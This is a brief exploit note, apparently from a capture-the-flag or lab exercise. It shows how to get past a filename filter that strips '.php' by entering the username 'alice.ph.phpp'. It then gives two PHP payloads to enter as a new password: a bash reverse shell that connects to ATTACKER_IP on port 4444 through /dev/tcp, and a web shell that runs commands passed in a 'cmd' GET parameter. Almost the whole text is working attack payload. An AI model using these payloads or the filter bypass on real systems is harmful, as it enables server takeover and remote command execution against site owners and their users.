User-> alice:abc123

Payload:

into Username: alice.ph.phpp (.php gets sanitized to empty string thus simply obtaining .php after sanitization)

into Old password: abc123

into New password (remove space between < and ?):
- RAW:< ?php exec("/bin/bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'");?>
- RAW:< ?php system($_GET['cmd']);?>

The first gets a Reverse shell, while the seconds allows you to put commands as 'cmd' get argument in each request.